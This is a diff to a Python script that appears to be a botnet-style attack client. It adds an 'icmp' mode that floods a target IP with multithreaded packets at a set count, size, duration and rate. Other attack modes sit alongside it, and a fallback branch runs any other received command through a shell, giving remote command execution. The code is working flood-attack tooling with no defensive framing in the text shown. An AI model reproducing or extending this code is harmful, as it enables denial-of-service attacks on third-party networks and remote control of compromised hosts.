@@ -139,6 +139,57 @@ if server_ready == "ready":
                 print(f"Error during attack: {e}")
             finally:
                 print("\nAttack completed")
+        
+        elif command_to_execute.split(" ")[0] == "icmp" :
+            counter_lock = threading.Lock()
+            sent_packets = 0
+            stop_threads = False
+
+            command_ls = command_to_execute.split(" ")
+            attack_mode = command_ls[0]
+            target_ip = command_ls[1]
+            number_of_packets = int(command_ls[3])
+            packet_size = int(command_ls[4])
+            number_of_threads = int(command_ls[5])
+            attack_duration = int(command_ls[6])
+            attack_rate = int(command_ls[7])
+
+            start_time = time.time()
+            delay = 1 / attack_rate
+
+            def send_packets():
+                global sent_packets
+                while not stop_threads and time.time() - start_time < attack_duration:
+
+                    with counter_lock:
+                        if sent_packets >= number_of_packets:
+                            break
+                        sent_packets += 1
+                    
+                    send_packet(target_ip, 0, packet_size, attack_mode)
+                    
+                    # Wait based on rate limiter
+                    time.sleep(delay)
+
+                    print(f"\rSent packet {sent_packets}", end="")
+
+            threads = []
+            try:
+                for i in range(number_of_threads):
+                    t = threading.Thread(target=send_packets)
+                    threads.append(t)
+                    t.start()
+                for t in threads:
+                    t.join()
+            except KeyboardInterrupt:
+                print("\nAttack stopped by user.")
+                stop_threads = True
+                for t in threads:
+                    t.join()
+            except Exception as e:
+                print(f"Error during attack: {e}")
+            finally:
+                print("\nAttack completed")
         else:
             output, error = subprocess.Popen(command_to_execute, 
                                             shell=True, 
